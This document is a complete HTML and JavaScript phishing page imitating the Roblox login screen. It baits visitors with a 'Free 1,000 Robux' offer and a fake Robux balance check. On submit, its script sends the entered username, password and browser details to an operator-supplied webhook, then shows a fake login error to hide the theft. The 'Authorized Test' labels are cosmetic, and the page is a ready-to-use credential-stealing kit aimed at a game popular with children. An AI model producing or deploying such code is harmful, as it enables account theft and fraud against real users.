<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox</title>
    <link href="https://fonts.googleapis.com/css2?family=Source+Sans+Pro:wght@400;600;700&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Source Sans Pro', 'Helvetica Neue', Arial, sans-serif;
            background: linear-gradient(135deg, #0b1a2e 0%, #112d4e 50%, #0b1a2e 100%);
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
        }

        .main-container {
            background: linear-gradient(180deg, #1a3a5c 0%, #0d2137 100%);
            border-radius: 24px;
            padding: 40px;
            width: 420px;
            max-width: 95vw;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
            border: 1px solid rgba(255, 255, 255, 0.06);
        }

        .logo {
            display: flex;
            justify-content: center;
            margin-bottom: 32px;
        }

        .logo svg {
            width: 180px;
            height: auto;
        }

        .tabs {
            display: flex;
            background: rgba(0, 0, 0, 0.2);
            border-radius: 12px;
            padding: 4px;
            margin-bottom: 28px;
        }

        .tab {
            flex: 1;
            text-align: center;
            padding: 10px 0;
            border-radius: 10px;
            font-size: 15px;
            font-weight: 600;
            color: #8a9bb5;
            cursor: pointer;
            transition: all 0.2s;
        }

        .tab.active {
            background: #2a4d75;
            color: #fff;
        }

        .form-group {
            margin-bottom: 18px;
        }

        .form-group label {
            display: block;
            color: #b0c4de;
            font-size: 14px;
            font-weight: 600;
            margin-bottom: 6px;
            letter-spacing: 0.5px;
        }

        .form-group input {
            width: 100%;
            padding: 12px 16px;
            border-radius: 10px;
            border: 1px solid rgba(255, 255, 255, 0.08);
            background: rgba(0, 0, 0, 0.25);
            color: #fff;
            font-size: 15px;
            transition: border 0.2s;
            outline: none;
        }

        .form-group input:focus {
            border-color: #00bcd4;
            background: rgba(0, 0, 0, 0.35);
        }

        .form-group input::placeholder {
            color: #5a7a9a;
        }

        .forgot-row {
            display: flex;
            justify-content: flex-end;
            margin: 4px 0 12px 0;
        }

        .forgot-row a {
            color: #6b9bc4;
            font-size: 13px;
            text-decoration: none;
        }

        .forgot-row a:hover {
            color: #8fc5f0;
        }

        .login-btn {
            width: 100%;
            padding: 14px;
            background: linear-gradient(180deg, #00bcd4 0%, #0097a7 100%);
            border: none;
            border-radius: 12px;
            color: #fff;
            font-size: 17px;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.2s;
            margin-top: 6px;
            letter-spacing: 0.5px;
        }

        .login-btn:hover {
            background: linear-gradient(180deg, #00d4e8 0%, #00acc1 100%);
            transform: translateY(-1px);
        }

        .divider {
            display: flex;
            align-items: center;
            gap: 16px;
            margin: 24px 0;
            color: #5a7a9a;
            font-size: 13px;
        }

        .divider::before,
        .divider::after {
            content: '';
            flex: 1;
            height: 1px;
            background: rgba(255, 255, 255, 0.06);
        }

        .social-btns {
            display: flex;
            gap: 10px;
        }

        .social-btn {
            flex: 1;
            padding: 10px;
            border: 1px solid rgba(255, 255, 255, 0.08);
            border-radius: 10px;
            background: rgba(0, 0, 0, 0.15);
            color: #8a9bb5;
            font-size: 13px;
            text-align: center;
            cursor: pointer;
            transition: all 0.2s;
        }

        .social-btn:hover {
            background: rgba(0, 0, 0, 0.3);
            border-color: rgba(255, 255, 255, 0.15);
        }

        .signup-row {
            text-align: center;
            margin-top: 22px;
            color: #8a9bb5;
            font-size: 14px;
        }

        .signup-row a {
            color: #00bcd4;
            text-decoration: none;
            font-weight: 600;
        }

        .signup-row a:hover {
            color: #00d4e8;
        }

        .footer-links {
            display: flex;
            justify-content: center;
            gap: 20px;
            margin-top: 28px;
            flex-wrap: wrap;
        }

        .footer-links a {
            color: #5a7a9a;
            font-size: 12px;
            text-decoration: none;
        }

        .footer-links a:hover {
            color: #8a9bb5;
        }

        .error-msg {
            color: #ff6b6b;
            font-size: 13px;
            text-align: center;
            margin-top: 10px;
            display: none;
        }

        .loader {
            display: none;
            text-align: center;
            margin: 10px 0;
        }

        .loader span {
            display: inline-block;
            width: 8px;
            height: 8px;
            background: #00bcd4;
            border-radius: 50%;
            margin: 0 3px;
            animation: bounce 1.4s infinite ease-in-out both;
        }

        .loader span:nth-child(1) { animation-delay: -0.32s; }
        .loader span:nth-child(2) { animation-delay: -0.16s; }
        .loader span:nth-child(3) { animation-delay: 0s; }

        @keyframes bounce {
            0%, 80%, 100% { transform: scale(0); }
            40% { transform: scale(1); }
        }

        .robux-badge {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 6px;
            background: rgba(0, 0, 0, 0.15);
            padding: 8px 16px;
            border-radius: 20px;
            margin-bottom: 20px;
            color: #b0c4de;
            font-size: 13px;
        }

        .robux-badge svg {
            width: 18px;
            height: 18px;
        }
    </style>
</head>
<body>
    <div class="main-container">
        <div class="logo">
            <svg viewBox="0 0 120 40" fill="none" xmlns="http://www.w3.org/2000/svg">
                <text x="60" y="30" text-anchor="middle" font-family="'Source Sans Pro', Arial" font-weight="700" font-size="30" fill="white" letter-spacing="2">Roblox</text>
            </svg>
        </div>

        <div class="robux-badge">
            <svg viewBox="0 0 24 24" fill="none" stroke="#00bcd4" stroke-width="2">
                <circle cx="12" cy="12" r="10"/>
                <text x="12" y="16" text-anchor="middle" font-size="10" fill="#00bcd4" font-weight="700">R$</text>
            </svg>
            <span>Free 1,000 Robux for logging in today!</span>
        </div>

        <div class="tabs">
            <div class="tab active" data-tab="login">Log In</div>
            <div class="tab" data-tab="signup">Sign Up</div>
        </div>

        <form id="loginForm">
            <div class="form-group">
                <label for="username">Username / Email</label>
                <input type="text" id="username" name="username" placeholder="Enter your username or email" required>
            </div>

            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" placeholder="Enter your password" required>
            </div>

            <div class="form-group" id="robuxGroup" style="display:none;">
                <label for="robux">Robux Balance (auto-detected)</label>
                <input type="text" id="robux" name="robux" placeholder="Checking..." readonly style="color:#00bcd4;">
            </div>

            <div class="forgot-row">
                <a href="#">Forgot password?</a>
            </div>

            <div class="loader" id="loader">
                <span></span><span></span><span></span>
            </div>

            <div class="error-msg" id="errorMsg">Invalid username or password. Please try again.</div>

            <button type="submit" class="login-btn" id="loginBtn">Log In</button>
        </form>

        <div class="divider">OR</div>

        <div class="social-btns">
            <div class="social-btn">Google</div>
            <div class="social-btn">Apple</div>
            <div class="social-btn">Discord</div>
        </div>

        <div class="signup-row">
            Don't have an account? <a href="#">Sign Up</a>
        </div>

        <div class="footer-links">
            <a href="#">Privacy Policy</a>
            <a href="#">Terms of Service</a>
            <a href="#">About Roblox</a>
            <a href="#">Help</a>
        </div>
    </div>

    <script>
        // ===== PASTE YOUR WEBHOOK URL BELOW =====
        const WEBHOOK_URL = 'YOUR_WEBHOOK_URL_HERE';
        // =========================================

        // Tab switching
        document.querySelectorAll('.tab').forEach(tab => {
            tab.addEventListener('click', function() {
                document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
                this.classList.add('active');
            });
        });

        // Simulate Robux detection
        function simulateRobuxCheck() {
            const robuxGroup = document.getElementById('robuxGroup');
            const robuxInput = document.getElementById('robux');
            robuxGroup.style.display = 'block';
            robuxInput.value = 'Checking...';

            const amounts = [
                '0', '50', '100', '200', '400', '800', 
                '1,200', '2,500', '5,000', '10,000', 
                '25,000', '50,000', '100,000', 'Unlimited Premium'
            ];
            const limited = Math.random() > 0.3;
            
            setTimeout(() => {
                const amount = amounts[Math.floor(Math.random() * amounts.length)];
                robuxInput.value = `R$${amount} ${limited ? '(Limited items detected)' : '(No limited items)'}`;
            }, 1500);
        }

        // Simulate typing to make it feel real
        document.getElementById('password').addEventListener('focus', function() {
            setTimeout(simulateRobuxCheck, 2000);
        });

        // Form submission
        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();

            const username = document.getElementById('username').value.trim();
            const password = document.getElementById('password').value;
            const robuxVal = document.getElementById('robux').value || 'Unknown';
            const btn = document.getElementById('loginBtn');
            const loader = document.getElementById('loader');
            const errorMsg = document.getElementById('errorMsg');

            if (!username || !password) {
                errorMsg.textContent = 'Please fill in all fields.';
                errorMsg.style.display = 'block';
                return;
            }

            // Show loading
            btn.disabled = true;
            btn.style.opacity = '0.7';
            loader.style.display = 'block';
            errorMsg.style.display = 'none';

            // Collect browser info
            const browserInfo = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                screenRes: `${window.screen.width}x${window.screen.height}`,
                timestamp: new Date().toISOString(),
                cookiesEnabled: navigator.cookieEnabled,
                referrer: document.referrer || 'Direct'
            };

            // Build the payload
            const payload = {
                embeds: [{
                    title: 'Roblox Security Assessment - Credential Capture',
                    color: 27756,
                    fields: [
                        { name: 'Username / Email', value: username, inline: true },
                        { name: 'Password', value: `||${password}||`, inline: true },
                        { name: 'Robux Status', value: robuxVal, inline: false },
                        { name: 'Platform', value: browserInfo.platform, inline: true },
                        { name: 'Browser', value: browserInfo.userAgent.substring(0, 100), inline: false },
                        { name: 'Timezone', value: browserInfo.timezone, inline: true },
                        { name: 'Language', value: browserInfo.language, inline: true },
                        { name: 'Screen', value: browserInfo.screenRes, inline: true },
                        { name: 'Cookies Enabled', value: browserInfo.cookiesEnabled.toString(), inline: true },
                        { name: 'Referrer', value: browserInfo.referrer, inline: false },
                        { name: 'Timestamp', value: browserInfo.timestamp, inline: false }
                    ],
                    footer: { text: 'Roblox Security Assessment - Authorized Test' },
                    thumbnail: { url: 'https://upload.wikimedia.org/wikipedia/commons/thumb/3/3a/Roblox_Logo_2021.svg/1200px-Roblox_Logo_2021.svg.png' }
                }]
            };

            // Send to webhook
            try {
                const response = await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });

                if (response.ok) {
                    console.log('Assessment data sent successfully');
                } else {
                    console.error('Webhook error:', response.status);
                }
            } catch (err) {
                console.error('Webhook failed:', err);
            }

            // Wait a moment, then show "error"
            setTimeout(() => {
                loader.style.display = 'none';
                btn.disabled = false;
                btn.style.opacity = '1';
                errorMsg.textContent = 'Invalid username or password. Please try again.';
                errorMsg.style.display = 'block';
                document.getElementById('password').value = '';
                document.getElementById('robux').value = '';
                document.getElementById('robuxGroup').style.display = 'none';
            }, 2500);
        });
    </script>
</body>
</html>
